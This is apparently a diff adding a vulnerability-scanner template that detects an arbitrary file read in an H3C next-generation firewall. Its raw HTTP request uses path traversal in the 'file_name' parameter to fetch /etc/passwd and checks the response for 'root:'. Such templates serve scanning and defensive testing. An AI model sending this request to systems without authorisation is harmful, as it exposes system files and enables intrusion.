@@ -1,0 +1,29 @@
+id: h3c-next-gen-firewall-file-read
+info:
+  name: H3C Next Generation Firewall Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Attackers can exploit this vulnerability to download arbitrary files on the server, potentially leading to information disclosure.
+  reference:
+    - http://wiki.peiqi.tech
+  tags: file-read
+
+variables:
+  target_file: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=sys_dia_data_down&file_name=../../../../..{{target_file}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+        part: body
